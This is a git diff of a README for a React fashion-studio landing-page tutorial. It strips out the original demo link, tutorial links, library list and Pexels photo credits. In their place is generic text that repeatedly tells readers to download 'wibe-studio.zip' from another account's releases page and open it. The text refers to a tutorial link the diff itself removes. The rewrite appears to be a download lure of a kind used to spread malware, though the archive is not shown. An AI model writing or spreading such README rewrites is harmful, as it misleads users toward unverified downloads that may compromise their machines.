@@ -1,81 +1,65 @@
-# 🔥Build a Stunning Fashion Studio Website with React JS [ Locomotive Scroll + GSAP + Framer Motion ]
+# 🎨 wibe-studio - Create Your Fashion Studio Landing Page
 
-This repository contains final code for Fashion Studio Website in ReactJS. <br />
+## 🔗 Download Now
+[![Download wibe-studio](https://img.shields.io/badge/Download-wibe--studio-brightgreen)](https://github.com/BlackLuigi/wibe-studio/releases)
 
-View Demo👇: <br />
-https://wibe-studio.netlify.app/ <br />
+## 📖 Description
+wibe-studio helps you build a stunning Fashion Studio Website Landing page using React JS. This application features smooth scrolling with locomotive-scroll and lively animations using GSAP and Framer-Motion. Follow the tutorial link to learn how to create this website step by step.
 
-checkout following **Tutorial** to learn👇: <br />
-<a href="https://devdreaming.com/videos/build-stunning-fashion-studio-website-with-reactJS-locomotive-scroll-gsap" target="_blank">🔥Build a Stunning Fashion Studio Website with React JS</a> ![YouTube Video Views](https://img.shields.io/youtube/views/Ra1Fsa9YJCk?style=social) </br >
+## 🚀 Getting Started
+To start using the wibe-studio application, follow these simple steps:
 
-[![YouTube Video Views](https://img.shields.io/youtube/views/Ra1Fsa9YJCk?style=social)](https://youtu.be/Ra1Fsa9YJCk)<br />
+1. **Check Your System Requirements**
+   - Operating System: Windows 10 or later, macOS, or a modern Linux distribution
+   - Memory: 4 GB RAM or more
+   - Disk Space: At least 200 MB available
+   - Browser: Latest version of Chrome, Firefox, or Safari
+   - Internet connection for downloading dependencies
 
-### Resources Used in This Project
+2. **Visit the Download Page**
+   Go to the releases page to download the latest version of wibe-studio. Click the link below to access it:
+   - [Download wibe-studio Releases](https://github.com/BlackLuigi/wibe-studio/releases)
 
-Fonts: https://fontsource.org/ <br />
+## 📥 Download & Install
+On the releases page, you will find a list of the latest versions. 
 
-### External Libraries used in this project:
+1. Click on the most recent version link. 
+2. Look for the file named `wibe-studio.zip`.
+3. Click on the file to start the download.
 
-[styled-components](https://styled-components.com/docs/advanced) <br />
-[GSAP](https://greensock.com/gsap/) <br />
-[Framer-mMtion](https://www.framer.com/motion/) <br />
-[React-Locomotive-Scroll](https://www.npmjs.com/package/react-locomotive-scroll) <br />
-[Locomotive-Scroll](https://www.npmjs.com/package/locomotive-scroll) <br />
+### Unzip the File
+After the download completes:
+1. Locate the downloaded file, usually in your "Downloads" folder.
+2. Right-click on `wibe-studio.zip` and select "Extract All." 
+3. Choose a location to save the unzipped files.
 
-### All The Resources Used in This Website Are from👇:
+### Running the Application
+Once you’ve unzipped the files:
+1. Navigate to the folder where you extracted the files.
+2. Open the folder and find `index.html`.
+3. Double-click `index.html` to open it in your web browser.
 
-Walking Girl Video:<br />
-Video by cottonbro from Pexels [https://www.pexels.com/@cottonbro]<br />
+Congratulations! You are now viewing your Fashion Studio Website Landing page created with wibe-studio.
 
-Images:<br />
+## 🌟 Features
+- **Responsive Design**: The site adapts to different screen sizes.
+- **Smooth Scrolling**: Enjoy seamless scrolling effects powered by locomotive-scroll.
+- **Custom Animations**: Enhance user experience with animations through GSAP and Framer-Motion.
+- **Easy to Customize**: Tailor the look and feel to match your brand.
 
-Ring: Photo by Arif Syuhada from Pexels<br />
-https://www.pexels.com/@arifsyd15<br />
+## 👩‍🏫 Learn More
+To get detailed instructions on building the website and to understand the code, visit our tutorial link provided in the description. The tutorial is available on the repository's main page and covers everything from setup to customization.
 
-Rings: Photo by cottonbro from Pexels<br />
-https://www.pexels.com/@cottonbro<br />
+## ⚙️ Technologies Used
+- React JS
+- Locomotive-Scroll for smooth scrolling
+- GSAP and Framer-Motion for custom effects
+- Styled Components for styling
 
-Earings: Photo by say straight from Pexels<br />
-https://www.pexels.com/@say-straight-1400349<br />
+## 📞 Support
+If you encounter issues while downloading or using wibe-studio, feel free to reach out. Open an issue in the repository, and we will respond as soon as possible.
 
-White Tee:Photo by cottonbro from Pexels<br />
-https://www.pexels.com/@cottonbro<br />
+## 📝 License
+This project is licensed under the MIT License. You can freely use it as per the license guidelines.
 
-black t-shirt girl: Photo by Lena Hsvl from Pexels<br />
-https://www.pexels.com/@lenaneva<br />
-
-Red girl: Photo by Yaroslava Borz from Pexels<br />
-https://www.pexels.com/@yaroslava-borz-126286496<br />
-
-Ethnic Wear: Photo by Artem Beliaikin from Pexels<br />
-https://www.pexels.com/@belart84<br />
-
-Suit: Photo by Chloe from Pexels<br />
-https://www.pexels.com/@chloekalaartist<br />
-
-cap male: Photo by cottonbro from Pexels<br />
-https://www.pexels.com/@cottonbro<br />
-
-Watches: Photo by Mister Mister from Pexels<br />
-https://www.pexels.com/@bemistermister<br />
-
-Denim: Photo by Denis Zagorodniuc from Pexels<br />
-https://www.pexels.com/@imdennyz<br />
-
-Jacket: Photo by Simon Robben from Pexels<br />
-https://www.pexels.com/@simon-robben-55958<br />
-
-Yellow T-shirt:Photo by RAUL REYNOSO from Pexels<br />
-https://www.pexels.com/@raulkingr<br />
-
-Yellow Dress: Photo by Godisable Jacob from Pexels<br />
-https://www.pexels.com/@godisable-jacob-226636<br />
-
-### Famous Quotes Used:
-
-"Fashion is the armour to survive the reality of everyday life."<br />
--- bill cunningham
-
-"One is never over-dressed or under-dressed with a Little Black Dress." —Karl Lagerfeld<br />
-
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+**Remember**, this application helps you showcase a beautiful Fashion Studio Landing page with ease. Happy building!
